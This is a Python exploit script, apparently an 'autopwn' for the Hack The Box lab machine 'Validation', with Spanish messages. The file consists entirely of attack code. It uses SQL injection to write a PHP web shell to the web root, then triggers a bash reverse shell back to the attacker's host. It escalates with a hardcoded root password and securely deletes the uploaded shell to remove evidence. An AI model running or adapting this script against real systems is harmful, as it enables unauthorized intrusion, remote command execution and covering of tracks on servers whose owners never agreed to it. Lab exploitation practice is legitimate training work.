#!/usr/bin/python3
#codinig:utf-8

import sys, time, signal, requests, argparse, threading, warnings
from pwn import *

warnings.filterwarnings("ignore")

def def_handler(sig,frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

rhost = "10.10.11.116"
main_url = "http://%s/" % rhost
lhost = ""
lport = 443
file_name = "shell.php"

def makeRequest():
    p1 = log.progress("Archivo %s" % file_name)
    p1.status("Generando inyección SQLi de subida de archivo %s" % file_name)
    time.sleep(1)
    data_post = {
        'username' : 'k4miyo',
        'country' : """Mexico' union select "<?php echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>'; ?>" into outfile "/var/www/html/%s"-- -""" %file_name
    }
    try:
        r = requests.post(main_url, data=data_post)
        p1.success("Archivo creado exitosamente")
        time.sleep(1)
    except:
        p1.failure("Ha ocurrido un error")
        time.sleep(1)
        sys.exit(1)
    
    p2 = log.progress("Reverse Shell")
    p2.status("Generando reverse shell")
    time.sleep(1)
    data_cmd = {
        'cmd' : "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (lhost,lport)
    }
    try:
        r = requests.post(main_url + "%s" % file_name, data=data_cmd, timeout=2)
    except requests.exceptions.Timeout:
        p2.success("Inyección cargada correctamente")
        time.sleep(1)
        pass
    except:
        p2.failuter("Ha ocurrido un error")
        time.sleep(1)
        sys.exit(1)


if __name__ == '__main__':
    argparser = argparse.ArgumentParser(description='Máquina Validation Hack The Box AutoPwn')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (default: 10.10.11.116)',
            default='10.10.11.116')
    argparser.add_argument('--lhost', type=str,
            help='Local host ip (Attacker)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (default: 443)',
            default='443')
    argparser.add_argument('--file', type=str,
            help='File to upload',
            required=True)
    args = argparser.parse_args()

    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    file_name = args.file + ".php"
    
    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
    p3 = log.progress("Reverse shell")
    p3.status("Esperando conexión...")
    time.sleep(1)
    shell = listen(lport,timeout=20).wait_for_connection()
    if shell.sock is None:
        p3.failure("No se ha recibido ninguna conexión")
        time.sleep(1)
        sys.exit(1)
    else:
        p3.success("Se ha recibido una conexión")
        time.sleep(1)
    shell.sendline("su root")
    shell.sendline("uhc-9qual-global-pw")
    shell.sendline("shred -zun 15 %s" % file_name)
    shell.interactive()
